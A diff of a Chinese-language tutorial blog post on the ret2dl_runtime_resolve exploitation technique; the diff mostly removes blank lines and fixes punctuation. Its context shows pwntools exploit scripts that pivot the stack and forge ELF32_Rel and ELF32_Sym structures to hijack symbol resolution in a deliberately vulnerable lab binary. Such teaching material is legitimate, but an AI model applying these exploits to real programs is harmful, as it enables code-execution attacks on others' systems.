@@ -14,15 +14,11 @@ tags: [ret2dl]
 
 这个过程同样可以被劫持，让函数地址绑定成另一个函数。
 
-
-
 ## ret2dl_runtime_resolve[^2]
 
 为方便阐述，笔者将在下文用 `ret2dl` 代替 `ret2dl_runtime_resolve` 。
 
 虽然 32 位程序和 64 位程序在函数参数传递上存在差异，但笔者仅讲述其中一种情况的 `ret2dl`。
-
-
 
 ### 源码
 
@@ -43,8 +39,6 @@ int main(){
 
 编译命令：`gcc -m32 -o example example.c -no-pie -fno-stack-protector -w`
 
-
-
 ### 查看并伪造函数绑定过程
 
 用 gdb 调试程序，断点打在 0x804918D ，也就是 read 函数被调用的位置，然后 __si__ , 发现程序会先跳转到 read 的 got 表内的地址，一开始应该是 read 的 plt 地址加 6 ，其内容如下
@@ -61,7 +55,7 @@ int main(){
 
 其过程为 `read@plt -> [read@got] = read@plt+6 -> push reloc_index -> push link_map -> _dl_runtime_resolve` ，该过程中的 reloc_index （上文中的 8 ）和 link_map （上文中的 dword ptr [\_GLOBAL_OFFSET_TABLE_+4]) 就是确定所绑定的函数信息的。那么这两个值的含义是什么呢，8 代表了绑定的函数信息在 `.rel.plt` 段对应的偏移。
 
-以这个程序的 read 为例，0x080482FC-080482F4的值就是 8
+以这个程序的 read 为例，0x080482FC-080482F4 的值就是 8
 
 ```
 LOAD:080482F4 ; ELF JMPREL Relocation Table
@@ -69,11 +63,9 @@ LOAD:080482F4                 Elf32_Rel <804C000h, 107h> ; R_386_JMP_SLOT __libc
 LOAD:080482FC                 Elf32_Rel <804C004h, 207h> ; R_386_JMP_SLOT read
 ```
 
-
-
 #### 伪造 reloc_index
 
-尝试伪造 reloc_index ，笔者打算用栈迁移的方法迁移栈到 .rel.plt 段之后伪造对应的结构体ELF32_Rel，信息和上文填的一样就行，也就是 0x804C004 和 0x207 。
+尝试伪造 reloc_index ，笔者打算用栈迁移的方法迁移栈到 .rel.plt 段之后伪造对应的结构体 ELF32_Rel，信息和上文填的一样就行，也就是 0x804C004 和 0x207 。
 
 ```python
 from pwn import *
@@ -90,13 +82,11 @@ b *0x804919A
 io = process(elf.path)
 gdb.attach(io, script)
 
-
 tar_stack = 0x804C800
 vuln_skip_rbp = 0x8049169
 leave_ret = 0x8049199
 analyse_func = 0x8049020
 analyse_func_no_push = 0x8049026
-
 
 rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
 dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
@@ -128,8 +118,6 @@ io.interactive()
 ```
 
 运行发现正确执行 read，可以交互进行读入。
-
-
 
 #### 伪造 ELF32_Rel 结构体的值
 
@@ -170,13 +158,11 @@ b *0x804919A
 io = process(elf.path)
 gdb.attach(io, script)
 
-
 tar_stack = 0x804C800
 vuln_skip_rbp = 0x8049169
 leave_ret = 0x8049199
 analyse_func = 0x8049020
 analyse_func_no_push = 0x8049026
-
 
 rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
 dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
@@ -211,8 +197,6 @@ io.sendline(payload)
 io.interactive()
 ```
 
-
-
 #### 伪造 ELF32_Sym 结构体的值
 
 ```C
@@ -244,7 +228,7 @@ LOAD:080482A2 aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:0804823C
 LOAD:080482B1                 align 2
 ```
 
-仅伪造 dt_name 就就好,
+仅伪造 dt_name 就就好，
 
 ```python
 from pwn import *
@@ -261,13 +245,11 @@ b *0x804919A
 io = process(elf.path)
 gdb.attach(io, script)
 
-
 tar_stack = 0x804C800
 vuln_skip_rbp = 0x8049169
 leave_ret = 0x8049199
 analyse_func = 0x8049020
 analyse_func_no_push = 0x8049026
-
 
 rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
 dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
@@ -300,13 +282,10 @@ payload += b'k'*12
 payload += p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)  #fake ELF32_Sym
 payload += b'read\0'
 
-
 io.sendline(payload)
 
 io.interactive()
 ```
-
-
 
 #### 劫持成目标函数
 
@@ -329,13 +308,11 @@ b *0x804919A
 io = process(elf.path)
 gdb.attach(io, script)
 
-
 tar_stack = 0x804C800
 vuln_skip_rbp = 0x8049169
 leave_ret = 0x8049199
 analyse_func = 0x8049020
 analyse_func_no_push = 0x8049026
-
 
 rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
 dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
@@ -376,15 +353,11 @@ io.sendline(payload)
 io.interactive()
 ```
 
-
-
 ### 总述
 
 ret2dl 的手法并不算难理解，主要的优点就是不依靠 libc 来执行任意函数。
 
 64 位的情况就留给师傅们自己尝试吧，如果有疑问也可以联系我。
-
-
 
 ## 参考文献
 
